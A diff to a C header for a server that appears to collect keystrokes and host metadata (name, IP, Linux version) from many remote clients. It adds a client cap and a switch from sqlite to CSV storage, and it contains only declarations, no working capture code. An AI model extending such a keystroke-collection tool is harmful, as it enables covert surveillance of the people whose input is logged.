@@ -8,6 +8,7 @@
 
 #define QUEUE_BUFFER_SIZE 1024
 #define STRING_BUFFER_SIZE 256
+#define MAX_NB_CLIENT 128
 
 /* meant for key translations from xkbcommon and the event we receive. :^) */
 typedef struct translated_key {
@@ -26,7 +27,7 @@ struct client_state {
   char current_buffer[STRING_BUFFER_SIZE];
   ssize_t nb_bytes_in_buffer;
 
-  /* client metadata */
+  /* client metadata dumped in database */
   char name[STRING_BUFFER_SIZE];
   char ipaddr[STRING_BUFFER_SIZE];
   char linux_version[STRING_BUFFER_SIZE];
@@ -42,7 +43,7 @@ typedef struct server_state {
   TAILQ_HEAD(listhead, client_state) clients;
 
   struct user_options {
-    char const db_filepath[STRING_BUFFER_SIZE]; // sqlite .db filepath
+    char const db_filepath[STRING_BUFFER_SIZE]; // .csv filepath
     unsigned short listen_port;
 
     /*
@@ -52,6 +53,8 @@ typedef struct server_state {
   } options;
 
   int sockfd;
+  int dbfd;
+
 } server_t;
 
 #define SUCCESSFUL 1
@@ -78,5 +81,8 @@ int init_remote_connection(server_t *instance);
 
 // lexxer.c
 int parse_cli_arguments(server_t *instance, int ac, char **av, char **envp);
+
+// csv.c
+int init_csv_dbfd(char const *filepath);
 
 #endif /* SERVER_H */
